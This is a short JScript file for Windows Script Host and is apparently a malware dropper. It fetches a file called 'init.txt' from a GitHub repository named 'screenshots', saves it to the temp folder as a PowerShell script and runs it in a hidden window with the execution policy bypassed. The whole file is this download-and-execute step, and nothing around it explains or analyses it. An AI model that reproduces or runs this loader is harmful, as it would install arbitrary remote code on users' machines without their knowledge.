var x=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
x.Open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
x.Send();
var fso=new ActiveXObject("Scripting.FileSystemObject");
var t=fso.GetSpecialFolder(2)+"\\t.ps1";
fso.CreateTextFile(t).Write(x.ResponseText);
new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy Bypass -File \""+t+"\"",0);
